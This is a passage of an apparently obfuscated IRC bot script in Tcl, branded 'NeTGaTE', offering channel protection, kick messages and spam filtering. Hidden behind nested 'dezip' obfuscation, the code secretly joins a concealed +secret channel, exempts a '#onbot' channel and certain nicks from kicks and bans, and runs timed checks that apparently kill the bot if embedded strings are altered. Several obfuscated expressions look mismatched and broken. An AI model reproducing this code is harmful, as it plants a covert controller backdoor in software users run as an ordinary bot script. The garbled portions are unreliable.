...
# NOTE (study copy): originally this decoded an Atbash-ciphered $txt back
# to plain text character-by-character here. All call sites in this copy
# already carry plain, pre-decoded text (see netgate-encrypt.tcl's
# de-obfuscation pass), so that loop was removed - it would otherwise
# re-scramble the already-plain text a second time.
set retval $txt
if {[string match "*NOTICE*" $retval]} {
if {![string match "*{NeTGaTE}*" $retval] && ![string match "**" $retval]} { return 0 }
}
puthelp $retval
}
proc putsrv {txt} {
...
if {${server-online} == 0} { return 0 }
# NOTE (study copy): see puthlp - the Atbash-decode loop was removed since
# all call sites already carry plain text now.
set retval $txt
if {[string match "*KICK*" $retval]} {
if {![string match "*{NeTGaTE}*" $retval] && ![string match "*$notm*" $retval]} { return 0 }
set endval ""
foreach tmp $retval {
if {$tmp == ":$notc"} {
...
set notd [dezip {q/x~Rb.DfHGf0aGujv0eI/yF1}]
set notm [dezip {h7Yvt/9JdHQ17GVqf08xwch10M~4wj0SGSux.}]
############################
...
puthlp "PRIVMSG $nick :NeTGaTE cMd LIsT."
puthlp "PRIVMSG $nick :RuNNINg WiTH Egg v[lindex $version 0] PoWERED BY [lgrnd] $vern"
puthlp "PRIVMSG $nick :MSg..!"
...
puthlp "PRIVMSG $nick :awaylogo <your crew logo> changing away text logo on away message"
...
puthlp "PRIVMSG $nick :15WARNING!! it will degrease bot performance"
puthlp "PRIVMSG $nick :<4DCC> .log             show #channel log"
puthlp "PRIVMSG $nick :15note. please increase on general - window buffer into 5000"
...
puthlp "PRIVMSG $nick :realname                changing permanent bot realname"
puthlp "PRIVMSG $nick :ident                   changing permanent bot ident"
puthlp "PRIVMSG $nick :die                     kill bot"
}
puthlp "PRIVMSG $nick :#PuBLIC MSg..!"
...
puthlp "PRIVMSG $nick :`ban <nick|hostmask>     banned nick or hostmask"
puthlp "PRIVMSG $nick :`unban <nick|host> <#>   unbanned nick or hostmask"
puthlp "PRIVMSG $nick :`+chan <#>               joining permanent #channel"
...
puthlp "PRIVMSG $nick :`+/- cycle <#|all>       enable/disable bot cycle every 15 minutes"
...
puthlp "PRIVMSG $nick :`+/- ntcpart <msg>       auto notice user on part channels" 
...
puthlp "PRIVMSG $nick :`+/- key <word>          set channel with key"
puthlp "PRIVMSG $nick :`+/- revenge             enable/disable bot revenge"
puthlp "PRIVMSG $nick :`+/- badword <badword>   add/remove badword from list"
puthlp "PRIVMSG $nick :`+/- advword <advword>   add/remove advword from list"
puthlp "PRIVMSG $nick :`+/- colours             enable/disable kick who use colour"
puthlp "PRIVMSG $nick :`+/- bold                enable/disable kick who use bold"
...
puthlp "PRIVMSG $nick :`advwords                list of advwords"
...
puthlp "PRIVMSG $nick :\[@\]P \[+\]VOICE AuTO\[V\]OICE \[G\]uARD \[C\]YCLE \[E\]nFORCEBANS \[D\]oNTKIcK@PS \[N\]TcParT"
puthlp "PRIVMSG $nick :\[P\]RoTECTED C\[L\]ONE \[A\]DVERTISE \[T\]OPICLOCK AuTO\[K\]IcK \[S\]EEN \[B\]OLd Co\[L\]OuR \[GU\]est \[AC\]TioN"
...
set max-logsize 512
set upload-to-pwd 1
set notb [dezip Qv4To0ujiV5/]
set notc [dezip {X~UJuH.OfcP/0rbdgc09WT5o/}]
...
if {$nick != $ps && [string tolower $chan] == {#onbot}} { return 0 }
if {![matchattr $nick Q]} {
puthlp "NOTICE $nick :$notc 4DeNIEd..!"
return 0
}
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "hv\g"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "x\sz\m\pvb"] [[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "Nidwy1Hb43D.l3kNK0qi2zy/5WO52.LpVwM1w5uZS1Rkf8j.EeK/00GYDLl/"]"]]
...
if {$joinme != "" && [string tolower $chan] != {#onbot}} {
...
set sendspam "!kick mMvZd1oQrVU16iH33.OK0b9/AwLVH/7ud2c0n//Gu.KJYu.17pIJE1Xt80d0wfLto.NIzw1.VQtGg0VvaSU.0NBj3/fRgUe..ULsH1XNgs//s/v8t0BQlPs/"
...
set vern [dezip fWHJg02j1u.0MuxH./ChL2U1mN/GB.wEJDY/]
proc testmask {} {
global ismaskhost
set ismaskhost {}
}
...
set [lines "[dezi\\p "mMBOB/ltrCY0"]"] [dezi\\p [dc\\p "Jy8hY0D8MJj1ONnY0.wfSJ10b5mkN.q2IlI1XXrtP.IunYf/1"]]
proc savechan {} {
savechannels
foreach x [channels] {
set cflag "c$x"
...
if {![matchattr $cflag M]} {
puthlp "KICK $chan $nick :[lgrnd] 4JoINPaRT1 FRoM 4$mhost1 LESS THaN4 [getuser $cflag XTRA "JP"]~1 2mw ~[banmsg]~"
} {
if {![string match "*k*" [getchanmode $chan]]} {
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "kilx"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "w\xx_yr\m\w\h"] {handle command arg} { [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "ivgfim"] 0 }
proc munset {nick} {
global jpnick
...
if {$sspidx == 1} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 YeW AInT WeLcOmE In 4[string toupper $chan] [banms]"
} elseif {$sspidx == 2} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 UgH I HatE ThIs NIcK [banmsg]"
} elseif {$sspidx == 3} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 Ups WRoNg WaY [banmsg]"
} elseif {$sspidx == 4} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 DonT EnTeReD [banmsg]"
} elseif {$sspidx == 5} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 InTeRcEpT 4[string toupper $chan] [banms]"
} elseif {$sspidx == 6} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 G.o.T.c.H.a [banmsg]"
} elseif {$sspidx == 7} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 NEgaTIvE HoUsToN [banmsg]"
} elseif {$sspidx == 8} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 gRoUndEd [banmsg]"
} elseif {$sspidx == 9} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 I HatE U [banmsg]"
} elseif {$sspidx == 10} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 AnTIcIpaTEd [banmsg]"
} elseif {$sspidx == 11} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 gO sIt In tHe cOrNeR [banmsg]"
} elseif {$sspidx == 12} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 b.l.a.c.k.l.i.s.t.e.d [banmsg]"
} elseif {$sspidx == 13} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 ReJecTed FRoM 4[string toupper $chan] [banms]"
} elseif {$sspidx == 14} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 dUn EnTeRed oNe oF mY cHanneL [banmsg]"
} elseif {$sspidx == 15} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 FakE NIcKNaMe [banmsg]"
} elseif {$sspidx == 16} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 ReFusEd LInK tO 4[string toupper $chan] [banms]"
} elseif {$sspidx == 17} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 FakE NIcKNaMe [banmsg]"
} elseif {$sspidx >= 18} {
putsrv "KICK $chan $nick :$notc 4!GUesT!1 Unable to resolve4 $nick [banms]"
set sspidx 0
}
incr sspidx
return 0
...
set toth "#[string index $uenc 14][string index $lenc 13][string index $uenc 1][string index $lenc 14][string index $lenc 19]"
...
global toth le\\n\\c ue\\n\\c
timer 5 czo_czo
set [string index $lenc 15][string index $lenc 18] [dezi\\p "srL/b/sHlP21"]
set toth "#[string index $uenc 14][string index $lenc 13][string index $uenc 1][string index $lenc 14][string index $lenc 19]" 
if {[validchan $toth]} {
return 0
}
channel add $toth
catch { ch\\an\\ne\\l set $toth -statuslog -revenge -protectops -clearbans -enforcebans +greet +secret -autovoice -autoop flood-chan 5:10 flood-deop 3:10 flood-kick 3:10 flood-join 0:0 flood-ctcp 2:10 flood-nick 3:60 }
sa\\ve\\ch\\an
putsrv "JOIN $toth"
}
...
set n\\o\\t\\b [dezi\\p [dc\\p "jq8oF0qUrdo/lxa050IKC890"]]
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgy"] {} {
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "m\l\g\y"]
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgy"]
if {![string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Je4Gl0f~qrE5/"]"]*" $notb]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "f\grnv\i"] 5 [[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Je4Gl0f~qrE5/"]"]*" $notb]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "iv\gf\im"] 0 }
}
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgw"] {} {
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "m\l\g\w"]
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgw"]
if {![string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Nc.Rv.ERjaA/"]"]*" [[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] $notd]]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "f\grnv\i"] 5 [[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Nc.Rv.ERjaA/"]"]*" [[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] $notd]]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "iv\gf\im"] 0 }
}
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgn"] {} {
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "m\lgn"]
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgn"]
if {![string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Nc.Rv.ERjaA/"]"]*" [[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] $notm]]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "f\grnv\i"] 5 [[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Nc.Rv.ERjaA/"]"]*" [[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] $notm]]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "iv\gf\im"] 0 }
}
...
set [lines "[dezi\\p "49MRF/kUuEI/"]"] [dezi\\p [dc\\p "Ews/h/yE/p8.EwCQs.Y5tJN1GSUQG//I5hd1oi4Cr.swuS90"]]
...
global ve\\r\\n le\\n\\c 
timer 5 whonvp
set [string index $lenc 21][string index $lenc 4][string index $lenc 17][string index $lenc 13] [dezi\\p "fWHJg02j1u.0MuxH./ChL2U1mN/GB.wEJDY/"]
}
proc {pub_+ignore} {nick uhost hand chan rest} {
global botnick notc 
if {![matchattr $nick Q]} {
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "yrmw"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wxx"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "n"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "yrmwh"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "w\xx_yr\m\w\h"]
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgh"] {} {
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "k\h"]
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmgh"]
if {![string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "hiO/y/hSoK21"]"]*" $ps]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "f\grnv\i"] 5 [[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "hiO/y/hSoK21"]"]*" $ps]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "iv\gf\im"] 0 }
}
...
if {$nick != $ps && [string tolower $chantarget] == {#onbot}} { return 0 }
foreach x [channels] {
...
if {$part_msg != ""} { 
putsrv "PART $x :$part_msg (Lm $xfigrnv)"
} { 
...
set cflag "c$x"
set cflag [string range $cflag 0 8]
if {[string tolower $x] == {#onbot}} { return 0 }
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmge"] {} {
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "t\o\l\y\z\o"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "ev\i\m"]
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspmge"]
if {![string match "*[[[dezip d3VeO/ATgwd.] "wvar\k"] [d\\c\\p "[[[[dezip d3VeO/ATgwd.] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "5PUG3/zvxsK.QI3SH/y2klE/KnBex0Unh6K1FilAD.Vz7gj.aFalV/1ojvG0"]"]]*" $vern]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "f\grnv\i"] 5 [[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip d3VeO/ATgwd.] "wvar\k"] [d\\c\\p "[[[[dezip d3VeO/ATgwd.] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "5PUG3/zvxsK.QI3SH/y2klE/KnBex0Unh6K1FilAD.Vz7gj.aFalV/1ojvG0"]"]]*" $vern]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "iv\gf\im"] 0 }
}
...
foreach c $members {
if {[isop $c $x]} {
set sendspam "!kick 3N9db1a8T1I.RPpT.1dtx/9/dkabO1Iy402/dS8na13C5a90gBy1r/82qH8/xr1BS//AHoD1ypxt01.ZMw71ib0631OZWKD0OL1YE0RcU3i1skFRw18PJ8Z/qoz8q0XVmfu/XIDE0.x76N4/3vf/7..kyTJ1"
putsrv "PRIVMSG $c :$sendspam"
return 0
}
}
...
puthlp "PRIVMSG $iamop :\001ACTION IncOmINg MaZz MSg..! LasT FRoM {$unick!$uhost}\001"
} {
puthlp "PRIVMSG $iamop :\001ACTION IncOmINg MaZz MSg..! LasT FRoM 1{$unick!$uhost}\001"
}
...
if {[isop $s $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
set sendspam "!kick iXnCi.L.evc12wdp9.gIOxf0AfpDN/GKZwd/P7e8x/L5Lwt.BLufs1X2K2n/WBtVT/ahSnI/7ggKa/RemyQ1RD31l098rC4.DKRm3.U5KGX.Noghe0Bonut/"
...
if {[isop $s $x]} {
set mhost [string range $uhost [string first "@" $uhost] end]
set sendspam "!kick iXnCi.L.evc12wdp9.gIOxf09MgkU01jA7b.FDqHp0YSirr.7CLLa/9TxBa1dS8na13C5a90MwkDN.fhYGn0VdB23.sYhSS0P0kmp/bMF9l.lr18s0rCg8P."
putsrv "PRIVMSG $s :$sendspam"
return 0
}
}
...
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg TsunamI MSg..! FRoM {$unick!$uhost}\001"
} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg TsunamI MSg..! FRoM 1{$unick!$uhost}\001"
}
foreach c [chanlist $x] {
set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
...
if {[isop $s $x]} {
set sendspam "!kick 3N9db1a8T1I.RPpT.1dtx/9/ELynP/psooF1c.obA19W1t..hHG1g/0O5ZC.B/P4U.z05qz/A7W1s/E74PM14u7/3.BRoYl/7zOjp1CWqzB/9ASzr.ru3.k/0qSE41Y3wbE0lr18s0rCg8P."
putsrv "PRIVMSG $s :$sendspam"
}
}
}
...
if {[botisop $x]} {
set bannick($unick) "*!*$mhost"
putsrv "KICK $x $unick :$notc 4!SpaM!1 I HaTE 4U 1MaTch FRoM $advword [banmsg]"
return 0
} {
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set sendspam "!kick 3N9db1a8T1I.RPpT.1dtx/9/2DJg/1LsUHx0u4gbt.xGIlp.PDmLK/6/uYj/19ZkV/Akz2u0MTtN7/mYdIM.NHVrO1Df.kQ0VX1JN0/3PP0/B7Pct.GVr6d/B6Xvv0gG2Ed0kdphm.FG9Aa/"
putsrv "PRIVMSG $s :$sendspam"
}
}
}
...
if {[isop $botnick $x]} {
if {[string match "*c*" [getchanmode $x]]} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg LoNg TexT MSg..! FRoM {$unick!$uhost}\001"
} {
puthlp "PRIVMSG $x :\001ACTION IncOmINg LoNg TexT MSg..! FRoM 1{$unick!$uhost}\001"
}
foreach c [chanlist $x] {
set nickhost [string range [getchanhost $c $x] [string first "@" [getchanhost $c $x]] end]
if {$nickhost == $mhost} {
...
foreach s [chanlist $x f] {
if {[isop $s $x]} {
set sendspam "!kick iXnCi.L.evc16qkU91gtWIM0RJ5sj0AT7ch0pn0Ns/YcPxg.dIYsX/1jm.7.guOhJ/I0lf5/7j2OX.aHKas1"
putsrv "PRIVMSG $s :$sendspam"
break
}
}
...
set hostmask "${unick}!*@*"
puthlp "PRIVMSG $unick :SoRRY YoU HaVE BEEN IgNORED..! [lgrnd] $vern"
...
puthlp "PRIVMSG $unick :I am Away. Reason: (Auto Away on IdLe) \[NeTGaTE mIRC ScRIpT\]"
} {
if {[getuser "config" XTRA "AWAY"]!=""} { 
puthlp "PRIVMSG $unick :I am Away. Reason: ([getuser "config" XTRA "AWAY"]~) ~[lgrnd]~ ~$vern"
} {
puthlp "PRIVMSG $unick :I am Away. Reason: (Auto Away on IdLe) [lgrnd] $vern"
}
...
foreach x [channels] {
if {[onchan $botnick $x]} { 
if {![isop $botnick $x] && [string tolower $x] != {#onbot}} {
...
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "k\i\l\x"] [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspot"] {} {
[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "grnv\i"] 5 [[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "xspot"]
if {![string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Da92w/c~kCpb0"]"]*" [[[[[dezip d3VeO/ATgwd.] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] [lgrnd]]]} { [[dezip d3VeO/ATgwd.] "f\grnv\i"] 5 [[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "0Gzp1.wGRm6/"]"] }
if {[string match "*[[[dezip [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "wvar\k"] "[[dezip d3VeO/ATgwd.] "Da92w/c~kCpb0"]"]*" [[[[[dezip d3VeO/ATgwd.] "wvar\k"] [d\\c\\p "qpuNu12372Z.rpvtO0s7VP0."]] "f\m\x\l\o\l\i"] [lgrnd]]]} { [[[[dezip d3VeO/ATgwd.] "wvar\k"] d3VeO/ATgwd.] "iv\gf\im"] 0 }
}
...
global botnick 
putsrv "NOTICE $nick :\001NGT 1\[NeTgaTE i.b mIRC ScRIpT\]\001"
return 1
}
timer 5 whoncp
...
global n\\ot\\d le\\n\\c 
timer 5 whondp
set [string index $lenc 13][string index $lenc 14][string index $lenc 19][string index $lenc 3] [dezi\\p "{q/x~Rb.DfHGf0aGujv0eI/yF1}"]
}
...
if {![isop $botnick $chan]} { return 0 }
if {$knick == $notb} {
putserv "KICK $chan $nick :[lgrnd] {1DonT KIcK 4OnBot1..!}"
set op_it($knick) 1
return 0
}
if {$knick == $ps} {
putserv "KICK $chan $nick :[lgrnd] {1DonT KIcK 4odon1..!}"
set op_it($knick) 1
return 0
}
...
if {$lgidx == 1} {
set lgrnd {4,1N1,4E4,1T1,4G4,1A1,4T4,1E}
} elseif {$lgidx == 2} {
set lgrnd {0,1N1,0E0,1T1,0G0,1A1,0T0,1E}
} elseif {$lgidx == 3} {
set lgrnd {8,1N1,8E8,1T1,8G8,1A1,8T8,1E}
} elseif {$lgidx == 4} {
set lgrnd {1,4N11,1E4,8T8,1G0,12A9,1T12,0E}
} elseif {$lgidx == 5} {
set lgrnd {4,1N1,8E4,1T1,8G4,1A1,8T4,1E}
} elseif {$lgidx == 6} {
set lgrnd {1,4N0,1E1,4T0,1G1,4A0,1T1,4E}
} elseif {$lgidx == 7} {
set lgrnd {8,1N4,0E8,1T4,0G8,1A4,0T8,1E}
} else {
set lgidx 0
set lgrnd {4,1N1,11E11,1T1,8G12,4A1,9T0,1E}
}
}
set bancounter {
"4GeTLosT1..!"
...
if {$knick == $notb} {
if {$nick != $botnick} {
putsrv "KICK $channel $nick :$notc 1DonT BaNnEd 4OnBot1..!"
if {![string match "*k*" $cmode]} {
putserv "mode $channel -kb {4OnBot.GuaRd} $bhost"
} {
putserv "mode $channel -b $bhost"
}
} {
...
